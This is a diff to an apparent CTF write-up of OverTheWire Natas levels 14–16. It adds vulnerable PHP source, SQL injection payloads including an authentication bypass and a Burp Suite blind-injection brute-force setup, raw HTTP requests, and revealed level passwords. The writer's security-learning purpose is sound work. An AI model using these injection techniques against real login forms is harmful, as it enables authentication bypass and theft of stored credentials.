@@ -1744,16 +1744,96 @@ URL: http://natas14.natas.labs.overthewire.org
 Username: natas14
 Password:  z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
 ```
-After login, the webpage displayed a message `For security reasons, we now only accept image files! Choose a JPEG to upload (max 1KB):` and along with `Browse...` and `Upload File` buttons. 
+After login, the webpage request input for username and password along with the login button. 
 
 Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
 ```html
+ <html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas14", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas14</h1>
+<div id="content">
+<?php
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas14', '<censored>');
+    mysqli_select_db($link, 'natas14');
 
-### Approach 
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
+            echo "Successful login! The password for natas15 is <censored><br>";
+    } else {
+            echo "Access denied!<br>";
+    }
+    mysqli_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+<?php } ?>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 ### Finding 
+By analyzing the source code, the following SQL query is constructed:
+```php
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+```
+User input is directly concatenated into the SQL query without any sanitization or parameterization. This introduces a SQL Injection vulnerability.
+
+### Approach 
+To exploit this vulnerability, the payload `" OR 1=1#` was used in the username field, the password field can be left empty or filled with any value, and the button login is clicked. 
+
+### Resulting SQL Query
+```sql
+SELECT * from users where username="" OR 1=1# " and password=""
+```
+Explanation:
+- " closes the original string
+- OR 1=1 makes the condition always true
+- # comments out the remaining part of the query
+
+This causes the query to return at least one valid row, bypassing authentication.
+
+### Exploitation
+After submitting the payload, the server responded with: `Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`. This confirms that authentication was successfully bypassed using SQL Injection.
+
 
 ### Analysis
+This level demonstrates a classic SQL Injection (SQLi) vulnerability caused by improper handling of user input.
+
+Key issues:
+- Direct concatenation of user input into SQL queries
+- No input validation or sanitization
+- Absence of prepared statements
+
+Security implications:
+- Authentication bypass
+- Unauthorized data access
+- Potential database compromise
+
+Recommended mitigations:
+- Use prepared statements (parameterized queries)
+- Apply proper input validation and escaping
+- Avoid exposing database queries in debug mode
 
 ---
 
@@ -1762,11 +1842,152 @@ Additionally, a **View Sourcecode** link was available for further inspection. B
 ```
 URL: http://natas15.natas.labs.overthewire.org
 Username: natas15
-Password: 
+Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
 ```
-After login, the following note is displayed: 
+After login, the webpage request input for username along with the `Check existance` button. 
+
+Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas15", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas15</h1>
+<div id="content">
+<?php
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas15', '<censored>');
+    mysqli_select_db($link, 'natas15');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysqli_query($link, $query);
+    if($res) {
+    if(mysqli_num_rows($res) > 0) {
+        echo "This user exists.<br>";
+    } else {
+        echo "This user doesn't exist.<br>";
+    }
+    } else {
+        echo "Error in query.<br>";
+    }
+
+    mysqli_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+<input type="submit" value="Check existence" />
+</form>
+<?php } ?>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
 
 ### Approach 
+
+we use payload `natas16" AND LENGTH(password)=32#` as the input for username and intercept it using burpsuite. 
+request content
+POST /index.php HTTP/1.1
+Host: natas15.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+Origin: http://natas15.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==
+Connection: keep-alive
+Referer: http://natas15.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
+Upgrade-Insecure-Requests: 1
+
+username=natas16%22+AND+LENGTH%28password%29%3D§1§%23
+
+username=natas16%22+AND+LENGTH%28password%29%3D`§1§`%23
+anchor this as the things want to brute force
+
+payload sets >> payload type: Numbers
+payload settings >> from: 1 && To:40 && Step:1
+number format >> base: Decimal && Min integer digits: 1 && Max integer digit:2
+
+click the butotn start attack at the right top corner. 
+
+identify the payload used which return the unique response with other payload. The unique response ontained is like below which generated by payload 32. 
+response content 
+HTTP/1.1 200 OK
+Date: Wed, 15 Apr 2026 13:45:26 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 913
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas15", "pass": "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx" };</script></head>
+<body>
+<h1>natas15</h1>
+<div id="content">
+This user exists.<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+therefore, we can know that the length of the password will be 32
+
+then we use payload `natas16" AND SUBSTRING(password,1,1)="a"#` as input for username and intercept this using burpsuite. 
+payload position 
+POST /index.php HTTP/1.1
+Host: natas15.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Origin: http://natas15.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==
+Connection: keep-alive
+Referer: http://natas15.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
+Upgrade-Insecure-Requests: 1
+
+username=natas16%22+AND+BINARY+SUBSTRING%28password%2C1%2C1%29%3D%22§a§%22%23
+
+username=natas16%22+AND+BINARY+SUBSTRING%28password%2C`1`%2C1%29%3D%22`§a§`%22%23
+
 
 ### Finding 
 
@@ -1779,7 +2000,7 @@ After login, the following note is displayed:
 ```
 URL: http://natas16.natas.labs.overthewire.org
 Username: natas16
-Password: 
+Password: hpkjKYviLQctEW33QmuXL6eDVfMW4sGo
 ```
 After login, the following note is displayed: 
 
